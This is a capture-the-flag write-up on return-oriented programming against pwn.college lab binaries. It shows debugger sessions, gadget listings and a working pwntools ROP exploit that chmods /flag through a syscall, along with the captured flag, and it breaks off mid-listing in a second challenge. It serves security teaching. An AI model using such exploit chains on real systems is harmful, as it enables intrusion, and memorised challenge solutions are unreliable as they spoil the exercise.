### Welcome to /challenge/stop-pop-and-rop-hard!
###

[LEAK] Your input buffer is located at: 0x7ffd17dc4dc0.
```

These are the things that we need to craft an exploit

- [ ] Location of the buffer
- [ ] location of the stored return pointer to `main()`

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  putchar@plt
0x0000000000401090  puts@plt
0x00000000004010a0  printf@plt
0x00000000004010b0  read@plt
0x00000000004010c0  setvbuf@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  bin_padding
0x0000000000401c1e  free_gadgets
0x0000000000401c69  challenge
0x0000000000401cc0  main
0x0000000000401d80  __libc_csu_init
0x0000000000401df0  __libc_csu_fini
0x0000000000401df8  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401c69 <+0>:     endbr64
   0x0000000000401c6d <+4>:     push   rbp
   0x0000000000401c6e <+5>:     mov    rbp,rsp
   0x0000000000401c71 <+8>:     sub    rsp,0x70
   0x0000000000401c75 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000401c78 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000401c7c <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x0000000000401c80 <+23>:    lea    rax,[rbp-0x50]
   0x0000000000401c84 <+27>:    mov    rsi,rax
   0x0000000000401c87 <+30>:    lea    rdi,[rip+0x37a]        # 0x402008
   0x0000000000401c8e <+37>:    mov    eax,0x0
   0x0000000000401c93 <+42>:    call   0x4010a0 <printf@plt>
   0x0000000000401c98 <+47>:    lea    rax,[rbp-0x50]
   0x0000000000401c9c <+51>:    mov    edx,0x1000
   0x0000000000401ca1 <+56>:    mov    rsi,rax
   0x0000000000401ca4 <+59>:    mov    edi,0x0
   0x0000000000401ca9 <+64>:    call   0x4010b0 <read@plt>
   0x0000000000401cae <+69>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401cb1 <+72>:    lea    rdi,[rip+0x37e]        # 0x402036
   0x0000000000401cb8 <+79>:    call   0x401090 <puts@plt>
   0x0000000000401cbd <+84>:    nop
   0x0000000000401cbe <+85>:    leave
   0x0000000000401cbf <+86>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+64` when the call to `read@plt` is made.

```
pwndbg> break *(challenge+64)
Breakpoint 1 at 0x401ca9
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop-hard 
###
### Welcome to /challenge/stop-pop-and-rop-hard!
###

[LEAK] Your input buffer is located at: 0x7ffeefcd0a30.


Breakpoint 1, 0x0000000000401ca9 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffeefcd0a30 ◂— 0
 RBX  0x401d80 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffeefcd0a30 ◂— 0
 R8   0x39
 R9   0x39
 R10  0x402032 ◂— 0x7661654c000a0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4010d0 (_start) ◂— endbr64 
 R13  0x7ffeefcd0ba0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffeefcd0a80 —▸ 0x7ffeefcd0ab0 ◂— 0
 RSP  0x7ffeefcd0a10 ◂— 0
 RIP  0x401ca9 (challenge+64) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401ca9 <challenge+64>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffeefcd0a30 ◂— 0
        nbytes: 0x1000
 
   0x401cae <challenge+69>    mov    dword ptr [rbp - 4], eax
   0x401cb1 <challenge+72>    lea    rdi, [rip + 0x37e]           RDI => 0x402036 ◂— 'Leaving!'
   0x401cb8 <challenge+79>    call   puts@plt                    <puts@plt>
 
   0x401cbd <challenge+84>    nop    
   0x401cbe <challenge+85>    leave  
   0x401cbf <challenge+86>    ret    
 
   0x401cc0 <main>            endbr64 
   0x401cc4 <main+4>          push   rbp
   0x401cc5 <main+5>          mov    rbp, rsp
   0x401cc8 <main+8>          sub    rsp, 0x20
─────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffeefcd0a10 ◂— 0
01:0008│-068     0x7ffeefcd0a18 —▸ 0x7ffeefcd0bb8 —▸ 0x7ffeefcd167c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffeefcd0a20 —▸ 0x7ffeefcd0ba8 —▸ 0x7ffeefcd165b ◂— '/challenge/stop-pop-and-rop-hard'
03:0018│-058     0x7ffeefcd0a28 ◂— 0x19275a6a0
04:0020│ rax rsi 0x7ffeefcd0a30 ◂— 0
05:0028│-048     0x7ffeefcd0a38 ◂— 0
06:0030│-040     0x7ffeefcd0a40 —▸ 0x70ab927564a0 (_IO_file_jumps) ◂— 0
07:0038│-038     0x7ffeefcd0a48 —▸ 0x70ab925fb53d (_IO_file_setbuf+13) ◂— test rax, rax
───────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401ca9 challenge+64
   1         0x401d65 main+165
   2   0x70ab92591083 __libc_start_main+243
   3         0x4010fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffeefcd0a30`
- [ ] location of the stored return pointer to `main()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffeefcd0a90:
 rip = 0x401ca9 in challenge; saved rip = 0x401d65
 called by frame at 0x7ffeefcd0ac0
 Arglist at 0x7ffeefcd0a80, args: 
 Locals at 0x7ffeefcd0a80, Previous frame's sp is 0x7ffeefcd0a90
 Saved registers:
  rbp at 0x7ffeefcd0a80, rip at 0x7ffeefcd0a88
```

- [x] Location of the buffer: `0x7ffeefcd0a30`
- [x] location of the stored return pointer to `main()`: `0x7ffeefcd0a88`

Now we can successfully craft.

Let's look at the ROP gadgets which are present in the challenge binary.

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ ROPgadget --binary /challenge/stop-pop-and-rop-hard 
Gadgets information
============================================================
0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
0x0000000000401c3d : add byte ptr [rax - 0x39], cl ; loopne 0x401c9b ; ret
0x0000000000401c4d : add byte ptr [rax - 0x39], cl ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401c5d : add byte ptr [rax - 0x39], cl ; ror byte ptr [r15], 5 ; ret
0x0000000000401dec : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401d72 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401d73 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401dee : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401d74 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401199 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010fb : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401d75 : add cl, cl ; ret
0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401197 : add eax, 0x2ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401c63 : add eax, 0x5d9000c3 ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401cbc : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401c29 : clc ; pop rdx ; ret
0x00000000004011b3 : cli ; jmp 0x401140
0x0000000000401103 : cli ; ret
0x0000000000401dfb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011b0 : endbr64 ; jmp 0x401140
0x0000000000401100 : endbr64 ; ret
0x0000000000401c59 : enter -0x3ca1, 0 ; add byte ptr [rax - 0x39], cl ; ror byte ptr [r15], 5 ; ret
0x0000000000401dcc : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401125 : je 0x401130 ; mov edi, 0x404050 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x404050 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011b4 : jmp 0x401140
0x0000000000401d68 : jmp 0x401d6c
0x000000000040100b : jmp 0x4840103f
0x000000000040112c : jmp rax
0x0000000000401cbe : leave ; ret
0x000000000040112d : loopne 0x401195 ; nop ; ret
0x0000000000401c41 : loopne 0x401c9b ; ret
0x0000000000401196 : mov byte ptr [rip + 0x2ecb], 1 ; pop rbp ; ret
0x0000000000401c5f : mov dword ptr [rbp - 0x40], 0xc3050f ; nop ; pop rbp ; ret
0x0000000000401d71 : mov eax, 0 ; leave ; ret
0x0000000000401127 : mov edi, 0x404050 ; jmp rax
0x00000000004010ff : nop ; endbr64 ; ret
0x0000000000401cbd : nop ; leave ; ret
0x0000000000401c14 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c15 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c16 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c17 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c18 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c19 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401c1a : nop ; nop ; pop rbp ; ret
0x0000000000401c1b : nop ; pop rbp ; ret
0x000000000040112f : nop ; ret
0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
0x0000000000401126 : or dword ptr [rdi + 0x404050], edi ; jmp rax
0x0000000000401c32 : pop r10 ; ret
0x0000000000401ddc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401dde : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401de0 : pop r14 ; pop r15 ; ret
0x0000000000401de2 : pop r15 ; ret
0x0000000000401c52 : pop r8 ; ret
0x0000000000401c3a : pop r9 ; ret
0x0000000000401c42 : pop rax ; ret
0x0000000000401ddb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401ddf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x0000000000401c3b : pop rcx ; ret
0x0000000000401c5a : pop rdi ; ret
0x0000000000401c2a : pop rdx ; ret
0x0000000000401de1 : pop rsi ; pop r15 ; ret
0x0000000000401c4a : pop rsi ; ret
0x0000000000401ddd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401128 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x000000000040101a : ret
0x0000000000401198 : retf
0x0000000000401c50 : rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401c51 : rol byte ptr [rcx + 0x58], 1 ; ret
0x0000000000401c60 : ror byte ptr [r15], 5 ; ret
0x0000000000401c61 : ror byte ptr [rdi], 5 ; ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401dfd : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401dfc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401c62 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x404050 ; jmp rax
0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x404050 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 98
```

### ROP chain: ret2stack

We will be doing the same ROP chain in this challenge as the [easy level](#rop-chain-ret2stack).

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initilaize values
pop_rax = 0x401c42
pop_rdi = 0x401c5a
pop_rsi = 0x401c4a
syscall = 0x401c62
buffer_addr = 0x7ffeefcd0a30
ret_addr = 0x7ffeefcd0a88

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop-hard')

# Extract the actual buffer address for that specific run
p.recvuntil(b"located at: ")
# Read until the next whitespace or newline to get just the hex
leak_str = p.recvline().strip().decode().strip('.')
buffer_addr = int(leak_str, 16)
print(f"[*] Leaked Buffer Address: {hex(buffer_addr)}")

flag_string = b"/flag\x00\x00\x00" 

payload = flat(
    flag_string,
    b"A" * (offset - len(flag_string)),

    # chmod("/flag", 0o777)
    pop_rdi, buffer_addr,
    pop_rsi, 0o777,
    pop_rax, 90,
    syscall
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:/$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop-hard': pid 543
[*] Leaked Buffer Address: 0x7ffcb2ba18e0
[*] Switching to interactive mode

[*] Process '/challenge/stop-pop-and-rop-hard' stopped with exit code -11 (SIGSEGV) (pid 543)
Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ cat /flag 
pwn.college{sR9w4ikcelRl9slp_7YVUhCbJbD.0FO0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP 2 (Easy)

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ /challenge/stop-pop-and-rop2-easy 
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!
```

This time the challenge does not tell us the location of the buffer.
Therefore, we cannot store our string at the beginning of the buffer and use it's address in out ROP chain.

What we can do however, is resuse some string which is already present in the binary.

Let's first understand the binary and get the following information:

- [ ] Location of the buffer
- [ ] location of the stored return pointer to `main()`
- [ ] Location of a NULL terminated string

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  cs_free@plt
0x0000000000401130  printf@plt
0x0000000000401140  read@plt
0x0000000000401150  strcmp@plt
0x0000000000401160  cs_disasm@plt
0x0000000000401170  mincore@plt
0x0000000000401180  setvbuf@plt
0x0000000000401190  cs_open@plt
0x00000000004011a0  cs_close@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  print_gadget
0x000000000040168d  print_chain
0x00000000004016fb  bin_padding
0x0000000000401d94  free_gadgets
0x0000000000401ddf  challenge
0x0000000000401f00  main
0x0000000000401fc0  __libc_csu_init
0x0000000000402030  __libc_csu_fini
0x0000000000402038  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401ddf <+0>:     endbr64
   0x0000000000401de3 <+4>:     push   rbp
   0x0000000000401de4 <+5>:     mov    rbp,rsp
   0x0000000000401de7 <+8>:     sub    rsp,0x60
   0x0000000000401deb <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x0000000000401dee <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000401df2 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000000000401df6 <+23>:    lea    rdi,[rip+0x139b]        # 0x403198
   0x0000000000401dfd <+30>:    call   0x401110 <puts@plt>
   0x0000000000401e02 <+35>:    lea    rdi,[rip+0x1407]        # 0x403210
   0x0000000000401e09 <+42>:    call   0x401110 <puts@plt>
   0x0000000000401e0e <+47>:    mov    rax,rsp
   0x0000000000401e11 <+50>:    mov    QWORD PTR [rip+0x32c8],rax        # 0x4050e0 <sp_>
   0x0000000000401e18 <+57>:    mov    rax,rbp
   0x0000000000401e1b <+60>:    mov    QWORD PTR [rip+0x329e],rax        # 0x4050c0 <bp_>
   0x0000000000401e22 <+67>:    mov    rdx,QWORD PTR [rip+0x3297]        # 0x4050c0 <bp_>
   0x0000000000401e29 <+74>:    mov    rax,QWORD PTR [rip+0x32b0]        # 0x4050e0 <sp_>
   0x0000000000401e30 <+81>:    sub    rdx,rax
   0x0000000000401e33 <+84>:    mov    rax,rdx
   0x0000000000401e36 <+87>:    shr    rax,0x3
   0x0000000000401e3a <+91>:    add    rax,0x2
   0x0000000000401e3e <+95>:    mov    QWORD PTR [rip+0x328b],rax        # 0x4050d0 <sz_>
   0x0000000000401e45 <+102>:   mov    rax,QWORD PTR [rip+0x3274]        # 0x4050c0 <bp_>
   0x0000000000401e4c <+109>:   add    rax,0x8
   0x0000000000401e50 <+113>:   mov    QWORD PTR [rip+0x3281],rax        # 0x4050d8 <rp_>
   0x0000000000401e57 <+120>:   lea    rax,[rbp-0x40]
   0x0000000000401e5b <+124>:   mov    edx,0x1000
   0x0000000000401e60 <+129>:   mov    rsi,rax
   0x0000000000401e63 <+132>:   mov    edi,0x0
   0x0000000000401e68 <+137>:   call   0x401140 <read@plt>
   0x0000000000401e6d <+142>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401e70 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401e73 <+148>:   cdqe
   0x0000000000401e75 <+150>:   lea    rcx,[rbp-0x40]
   0x0000000000401e79 <+154>:   mov    rdx,QWORD PTR [rip+0x3258]        # 0x4050d8 <rp_>
   0x0000000000401e80 <+161>:   sub    rcx,rdx
   0x0000000000401e83 <+164>:   mov    rdx,rcx
   0x0000000000401e86 <+167>:   add    rax,rdx
   0x0000000000401e89 <+170>:   shr    rax,0x3
   0x0000000000401e8d <+174>:   mov    rdx,rax
   0x0000000000401e90 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401e93 <+180>:   mov    esi,eax
   0x0000000000401e95 <+182>:   lea    rdi,[rip+0x13dc]        # 0x403278
   0x0000000000401e9c <+189>:   mov    eax,0x0
   0x0000000000401ea1 <+194>:   call   0x401130 <printf@plt>
   0x0000000000401ea6 <+199>:   lea    rdi,[rip+0x1403]        # 0x4032b0
   0x0000000000401ead <+206>:   call   0x401110 <puts@plt>
   0x0000000000401eb2 <+211>:   lea    rdi,[rip+0x145f]        # 0x403318
   0x0000000000401eb9 <+218>:   call   0x401110 <puts@plt>
   0x0000000000401ebe <+223>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401ec1 <+226>:   cdqe
   0x0000000000401ec3 <+228>:   lea    rcx,[rbp-0x40]
   0x0000000000401ec7 <+232>:   mov    rdx,QWORD PTR [rip+0x320a]        # 0x4050d8 <rp_>
   0x0000000000401ece <+239>:   sub    rcx,rdx
   0x0000000000401ed1 <+242>:   mov    rdx,rcx
   0x0000000000401ed4 <+245>:   add    rax,rdx
   0x0000000000401ed7 <+248>:   shr    rax,0x3
   0x0000000000401edb <+252>:   add    eax,0x1
   0x0000000000401ede <+255>:   mov    edx,eax
   0x0000000000401ee0 <+257>:   mov    rax,QWORD PTR [rip+0x31f1]        # 0x4050d8 <rp_>
   0x0000000000401ee7 <+264>:   mov    esi,edx
   0x0000000000401ee9 <+266>:   mov    rdi,rax
   0x0000000000401eec <+269>:   call   0x40168d <print_chain>
   0x0000000000401ef1 <+274>:   lea    rdi,[rip+0x1462]        # 0x40335a
   0x0000000000401ef8 <+281>:   call   0x401110 <puts@plt>
   0x0000000000401efd <+286>:   nop
   0x0000000000401efe <+287>:   leave
   0x0000000000401eff <+288>:   ret
End of assembler dump.
```

Let's set a breakpoint at the address where `read@plt` is called.

```
pwndbg> break *(challenge+137)
Breakpoint 1 at 0x401e68
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop2-easy 
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!


Breakpoint 1, 0x0000000000401e68 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RBX  0x401fc0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7bff6bb76297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 R8   0x61
 R9   0x32
 R10  0x4005b3 ◂— 0x72616863747570 /* 'putchar' */
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffd2b5e9d40 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd2b5e9c20 —▸ 0x7ffd2b5e9c50 ◂— 0
 RSP  0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
 RIP  0x401e68 (challenge+137) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x401e68 <challenge+137>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
        nbytes: 0x1000
 
   0x401e6d <challenge+142>    mov    dword ptr [rbp - 4], eax
   0x401e70 <challenge+145>    mov    eax, dword ptr [rbp - 4]
   0x401e73 <challenge+148>    cdqe   
   0x401e75 <challenge+150>    lea    rcx, [rbp - 0x40]
   0x401e79 <challenge+154>    mov    rdx, qword ptr [rip + 0x3258]     RDX, [rp_]
   0x401e80 <challenge+161>    sub    rcx, rdx
   0x401e83 <challenge+164>    mov    rdx, rcx
   0x401e86 <challenge+167>    add    rax, rdx
   0x401e89 <challenge+170>    shr    rax, 3
   0x401e8d <challenge+174>    mov    rdx, rax
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd2b5e9bc0 —▸ 0x7bff6ba65740 ◂— 0x7bff6ba65740
01:0008│-058     0x7ffd2b5e9bc8 —▸ 0x7ffd2b5e9d58 —▸ 0x7ffd2b5eb683 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7ffd2b5e9bd0 —▸ 0x7ffd2b5e9d48 —▸ 0x7ffd2b5eb661 ◂— '/challenge/stop-pop-and-rop2-easy'
03:0018│-048     0x7ffd2b5e9bd8 ◂— 0x16baf8e93
04:0020│ rax rsi 0x7ffd2b5e9be0 —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-038     0x7ffd2b5e9be8 ◂— 0xa /* '\n' */
06:0030│-030     0x7ffd2b5e9bf0 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7bff6bc556a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7ffd2b5e9bf8 —▸ 0x7bff6baee302 (putchar+130) ◂— mov r8d, eax
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401e68 challenge+137
   1         0x401fa5 main+165
   2   0x7bff6ba8c083 __libc_start_main+243
   3         0x4011de _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [ ] location of the stored return pointer to `main()`
- [ ] Location of a NULL terminated string

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd2b5e9c30:
 rip = 0x401e68 in challenge; saved rip = 0x401fa5
 called by frame at 0x7ffd2b5e9c60
 Arglist at 0x7ffd2b5e9c20, args: 
 Locals at 0x7ffd2b5e9c20, Previous frame's sp is 0x7ffd2b5e9c30
 Saved registers:
  rbp at 0x7ffd2b5e9c20, rip at 0x7ffd2b5e9c28
```

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
- [ ] Location of a NULL terminated string

Now, let's look at the ROP gadgets that we have at our disposal.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop2-easy 
Gadgets information
============================================================
0x0000000000401687 : adc eax, 0xc9fffffb ; ret
0x00000000004011dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401487 : add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040120b : add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401e2f : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401e7f : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040156f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401db3 : add byte ptr [rax - 0x39], cl ; loopne 0x401dfa ; pop rax ; ret
0x0000000000401504 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401502 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x00000000004012f2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x000000000040202c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004012f4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401574 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x000000000040163f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401fb2 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401fb3 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040127a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040202e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004012f6 : add byte ptr [rax], al ; jmp 0x401470
0x0000000000401576 : add byte ptr [rax], al ; jmp 0x401608
0x0000000000401641 : add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bf : add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401fb4 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401279 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011db : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401fb5 : add cl, cl ; ret
0x000000000040120a : add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040127c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ef : add eax, 0x3db8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401277 : add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401db1 : add eax, 0xc74800c3 ; loopne 0x401dfa ; pop rax ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401e8c : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004016f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040148c : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401573 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401d9f : clc ; pop rax ; ret
0x00000000004016bc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401293 : cli ; jmp 0x401220
